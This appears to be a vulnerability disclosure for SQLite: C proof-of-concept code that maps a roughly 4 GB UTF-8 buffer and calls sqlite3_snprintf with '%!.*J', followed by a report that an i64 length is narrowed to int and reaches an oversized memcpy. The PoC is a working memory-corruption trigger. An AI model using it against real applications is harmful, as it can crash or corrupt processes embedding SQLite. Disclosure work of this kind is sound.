#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include "sqlite3.h"

#ifndef POC_DIR
#define POC_DIR "."
#endif

enum {
CHUNK_SIZE = 2 * 1024 * 1024,
CHUNK_COUNT = 2048,
INPUT_CHARS = 1073741824
};

static void die_errno(const char *op) {
fprintf(stderr, "%s: %s\n", op, strerror(errno));
exit(2);
}

static int make_chunk_file(const char *path, int last) {
int fd = open(path, O_CREAT | O_TRUNC | O_RDWR, 0600);
unsigned char *map;

if (fd < 0) die_errno("open chunk");
if (ftruncate(fd, CHUNK_SIZE) != 0) die_errno("ftruncate chunk");

map = mmap(NULL, CHUNK_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
if (map == MAP_FAILED) die_errno("mmap chunk");

for (size_t i = 0; i < CHUNK_SIZE; i += 4) {
map[i + 0] = 0xf0;
map[i + 1] = 0x90;
map[i + 2] = 0x80;
map[i + 3] = 0x80;
}
if (last) {
map[CHUNK_SIZE - 4] = 0xe0;
map[CHUNK_SIZE - 3] = 0xa0;
map[CHUNK_SIZE - 2] = 0x80;
map[CHUNK_SIZE - 1] = 0x00;
}

if (msync(map, CHUNK_SIZE, MS_SYNC) != 0) die_errno("msync chunk");
if (munmap(map, CHUNK_SIZE) != 0) die_errno("munmap chunk");
return fd;
}

static char *map_huge_utf8(const char *dir) {
char full_path[256];
char last_path[256];
size_t total = (size_t)CHUNK_SIZE * CHUNK_COUNT;
char *base;
int full_fd;
int last_fd;

snprintf(full_path, sizeof(full_path), "%s/full.chunk", dir);
snprintf(last_path, sizeof(last_path), "%s/last.chunk", dir);
full_fd = make_chunk_file(full_path, 0);
last_fd = make_chunk_file(last_path, 1);

base = mmap(NULL, total, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
if (base == MAP_FAILED) die_errno("reserve huge range");

for (size_t i = 0; i < CHUNK_COUNT; i++) {
int fd = i == CHUNK_COUNT - 1 ? last_fd : full_fd;
void *want = base + i * (size_t)CHUNK_SIZE;
void *got = mmap(want, CHUNK_SIZE, PROT_READ, MAP_PRIVATE | MAP_FIXED, fd, 0);
if (got != want) die_errno("map chunk into range");
}

close(full_fd);
close(last_fd);
return base;
}

int main(void) {
char out[16];
char *input = map_huge_utf8(POC_DIR);

fprintf(stderr, "input=%p precision=%d terminator=%02x\n",
(void *)input, INPUT_CHARS, (unsigned char)input[0xffffffffULL]);
sqlite3_snprintf(sizeof(out), out, "%!.*J", INPUT_CHARS, input);
fprintf(stderr, "returned: %.15s\n", out);
return 0;
}

Expected Behavior
SQLite should reject or clamp a %!J expanded byte count that cannot be
represented by the append API's int length.

Actual Behavior
The formatter appends the opening quote, computes an expanded byte count of
0xffffffff, narrows it to -1, and passes that value to
sqlite3_str_append().

Impact
Memory safety violation: a public formatter call with valid large input can
reach an oversized memcpy() and corrupt or crash the embedding process.

Evidence
In src/printf.c, the %!J branch of sqlite3VXPrintf() expands
character precision in i64 px, but the final
sqlite3_str_append(pAccum, &escarg[j], i-j) call narrows the i64 distance
to int without a bounds check.

